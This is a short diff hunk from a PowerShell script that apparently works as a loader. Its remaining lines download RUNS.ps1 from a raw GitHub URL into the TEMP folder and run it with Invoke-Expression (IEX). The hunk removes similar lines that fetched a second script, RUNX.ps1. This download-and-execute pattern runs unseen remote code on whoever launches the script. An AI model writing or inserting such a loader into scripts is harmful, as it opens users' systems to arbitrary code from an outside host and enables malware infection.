@@ -9,6 +9,3 @@ $url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
 $output5 = "$env:TEMP\RUNS.ps1"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
 IEX (Get-Content $output5 | Out-String)
-$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNX.ps1"
-$output2 = "$env:TEMP\RUNX.ps1"
-Invoke-WebRequest -Uri $url2 -OutFile $output2
